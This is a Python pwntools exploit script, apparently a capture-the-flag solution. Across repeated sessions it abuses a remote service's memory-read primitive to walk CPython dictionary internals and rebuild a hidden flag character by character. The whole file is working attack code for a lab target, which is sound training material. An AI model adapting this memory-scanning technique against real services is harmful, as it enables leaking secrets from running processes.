from pwn import *
import re
import time
import json
import os

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

def single_scan_session_with_indices():
    """Run one scanning session and return found characters WITH their original indices"""
    try:
        context.log_level = 'error'  # Reduce noise
        io = remote(HOST, PORT, ssl=True)
        
        # Get dict address
        intro = io.recvline_contains(b'flag is over at').decode()
        banner2 = io.recvline().decode()
        
        m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
        if not m:
            io.close()
            return {}, {}
            
        dict_obj_addr = int(m.group(1), 16)
        
        def read_memory(addr):
            addr_str = f"{addr:x}"
            io.sendline(addr_str.encode())
            line = io.recvline(timeout=2).decode().strip()
            
            if 'illegal memory address' in line:
                return None
                
            parts = line.split(': ')
            if len(parts) >= 2:
                hex_data = parts[-1].strip()
                try:
                    return bytes.fromhex(hex_data)
                except:
                    return None
            return None
        
        # Get ma_keys pointer
        ma_keys_data = read_memory(dict_obj_addr + 0x20)
        if not ma_keys_data:
            io.close()
            return {}, {}
            
        ma_keys_ptr = u64(ma_keys_data)
        
        flag_mapping = {}  # index -> character mapping
        reads_used = 1
        max_reads = 45
        
        # Try to find the actual dict entries (PyDictKeyEntry structures)
        # Each entry has: hash(8) + key_ptr(8) + value_ptr(8) = 24 bytes
        
        # Scan for dict entries more systematically
        for offset in range(0x50, 0x800, 8):  # Scan even larger range
            if reads_used >= max_reads - 10:
                break
                
            scan_addr = ma_keys_ptr + offset
            data = read_memory(scan_addr)
            reads_used += 1
            
            if data:
                ptr_val = u64(data)
                
                # Look for heap pointers that could be key or value objects
                if 0x400000 < ptr_val < 0x800000000000 and reads_used < max_reads - 8:
                    
                    # This might be part of a PyDictKeyEntry
                    # Try to read what could be the next field (key or value)
                    next_data = read_memory(scan_addr + 8)
                    reads_used += 1
                    
                    if next_data:
                        next_ptr = u64(next_data)
                        
                        # If we have two consecutive pointers, this might be key+value pair
                        if 0x400000 < next_ptr < 0x800000000000:
                            
                            # Try to read both as potential key and value objects
                            key_obj = None
                            value_obj = None
                            
                            # Read potential key object (should be small integer)
                            if reads_used < max_reads - 6:
                                for key_offset in [0x18, 0x20, 0x10]:  # Try multiple offsets
                                    if reads_used >= max_reads - 5:
                                        break
                                    key_data = read_memory(ptr_val + key_offset)
                                    reads_used += 1
                                    
                                    if key_data:
                                        # Try to extract small integer value (0-100 range for flag indices)
                                        for i in range(0, min(8, len(key_data)), 4):
                                            if i + 4 <= len(key_data):
                                                val32 = int.from_bytes(key_data[i:i+4], 'little')
                                                if 0 <= val32 <= 100:  # Reasonable flag index
                                                    key_obj = val32
                                                    break
                                            if i + 8 <= len(key_data):
                                                val64 = int.from_bytes(key_data[i:i+8], 'little') 
                                                if 0 <= val64 <= 100:
                                                    key_obj = val64
                                                    break
                                        if key_obj is not None:
                                            break
                            
                            # Read potential value object (should be single character)
                            if reads_used < max_reads - 4:
                                for str_offset in [0x28, 0x30, 0x38, 0x20, 0x40]:  # Try more string offsets
                                    if reads_used >= max_reads - 3:
                                        break
                                        
                                    value_data = read_memory(next_ptr + str_offset)
                                    reads_used += 1
                                    
                                    if value_data:
                                        # Look for single character
                                        for b in value_data:
                                            if 32 <= b <= 126:
                                                char = chr(b)
                                                if (char.isalnum() or char in '{}_.,-!@#$%^&*()[]|\\:;"<>?/~`'):
                                                    value_obj = char
                                                    break
                                            elif b == 0:
                                                break
                                        if value_obj:
                                            break
                            
                            # If we found both a reasonable index and character, store the mapping
                            if key_obj is not None and value_obj is not None:
                                flag_mapping[key_obj] = value_obj
        
        io.close()
        return flag_mapping, {'reads_used': reads_used, 'ma_keys': ma_keys_ptr}
        
    except Exception as e:
        try:
            io.close()
        except:
            pass
        return {}, {'error': str(e)}

def load_existing_mapping():
    """Load existing flag mapping from JSON file if it exists"""
    if os.path.exists('flag_index_mapping.json'):
        try:
            with open('flag_index_mapping.json', 'r') as f:
                data = json.load(f)
                return {int(k): v for k, v in data.get('flag_mapping', {}).items()}
        except:
            return {}
    return {}

def aggregate_flag_mappings(num_sessions=25, existing_mapping=None):
    """Run multiple sessions to build complete flag mapping"""
    
    if existing_mapping is None:
        existing_mapping = {}
    
    print(f"=== EXTENDED MULTI-SESSION FLAG INDEX MAPPING ===")
    print(f"Starting with {len(existing_mapping)} existing mappings")
    print(f"Running {num_sessions} sessions to find remaining indices...")
    
    complete_mapping = existing_mapping.copy()
    all_sessions = []
    
    for session_num in range(num_sessions):
        print(f"\nSession {session_num + 1}/{num_sessions}:")
        
        session_mapping, metadata = single_scan_session_with_indices()
        
        if session_mapping:
            new_mappings = 0
            conflicts = 0
            for index, char in session_mapping.items():
                if index not in complete_mapping:
                    complete_mapping[index] = char
                    new_mappings += 1
                elif complete_mapping[index] != char:
                    print(f"    CONFLICT at index {index}: existing '{complete_mapping[index]}' vs new '{char}'")
                    conflicts += 1
            
            print(f"  Found: {len(session_mapping)} mappings, New: {new_mappings}")
            if conflicts:
                print(f"  Conflicts: {conflicts}")
            
            # Show new mappings found
            if new_mappings > 0:
                new_items = [(i, session_mapping[i]) for i in session_mapping if i not in existing_mapping]
                print(f"  NEW: {sorted(new_items)}")
            
            all_sessions.append({
                'session': session_num + 1,
                'mappings': session_mapping,
                'metadata': metadata
            })
        else:
            error = metadata.get('error', 'Unknown error')
            print(f"  Failed: {error}")
        
        # Show current progress
        if complete_mapping:
            max_index = max(complete_mapping.keys())
            completion = len(complete_mapping) / (max_index + 1) * 100
            print(f"  Progress: {len(complete_mapping)}/{max_index + 1} ({completion:.1f}%)")
        
        time.sleep(0.3)  # Shorter delay for faster scanning
    
    return complete_mapping, all_sessions

# Run the extended aggregation
if __name__ == "__main__":
    # Load existing mappings
    existing = load_existing_mapping()
    print(f"Loaded {len(existing)} existing mappings")
    
    # Run extended scanning
    flag_mapping, sessions = aggregate_flag_mappings(30, existing)  # Run 30 sessions
    
    print(f"\n" + "="*70)
    print(f"FINAL FLAG RECONSTRUCTION RESULTS")
    print(f"="*70)
    
    if flag_mapping:
        max_index = max(flag_mapping.keys())
        missing_indices = [i for i in range(max_index + 1) if i not in flag_mapping]
        
        print(f"\nFound {len(flag_mapping)} out of {max_index + 1} total characters")
        print(f"Completion: {len(flag_mapping)}/{max_index + 1} ({100 * len(flag_mapping) / (max_index + 1):.1f}%)")
        
        # Reconstruct the flag in correct order
        flag_chars = []
        for i in range(max_index + 1):
            if i in flag_mapping:
                flag_chars.append(flag_mapping[i])
            else:
                flag_chars.append('?')
        
        reconstructed_flag = ''.join(flag_chars)
        print(f"\nReconstructed flag: {reconstructed_flag}")
        
        if missing_indices:
            print(f"\nStill missing {len(missing_indices)} indices:")
            print(f"Missing: {missing_indices[:20]}{'...' if len(missing_indices) > 20 else ''}")
        else:
            print(f"\n🎉 COMPLETE FLAG FOUND: {reconstructed_flag}")
        
        # Show all found mappings in order
        print(f"\nComplete index mappings:")
        for i in range(max_index + 1):
            if i in flag_mapping:
                print(f"  {i:2d} -> '{flag_mapping[i]}'")
        
    else:
        print("No flag mappings found.")
    
    # Save updated results
    results = {
        'flag_mapping': flag_mapping,
        'reconstructed_flag': ''.join(flag_mapping.get(i, '?') for i in range(max(flag_mapping.keys()) + 1)) if flag_mapping else '',
        'clean_flag': ''.join(flag_mapping[i] for i in sorted(flag_mapping.keys())) if flag_mapping else '',
        'completion_stats': {
            'found_indices': len(flag_mapping),
            'max_index': max(flag_mapping.keys()) if flag_mapping else 0,
            'missing_indices': [i for i in range(max(flag_mapping.keys()) + 1) if i not in flag_mapping] if flag_mapping else [],
            'completion_percent': 100 * len(flag_mapping) / (max(flag_mapping.keys()) + 1) if flag_mapping else 0
        },
        'all_sessions': sessions
    }
    
    with open('flag_index_mapping.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\nResults saved to: flag_index_mapping.json")
    
    if flag_mapping and len([i for i in range(max(flag_mapping.keys()) + 1) if i not in flag_mapping]) == 0:
        print(f"\n🏁 FLAG IS COMPLETE AND READY TO SUBMIT!")
        print(f"Final flag: {reconstructed_flag}")
    else:
        remaining = len([i for i in range(max(flag_mapping.keys()) + 1) if i not in flag_mapping]) if flag_mapping else 0
        print(f"\nContinue running more sessions to find {remaining} remaining characters")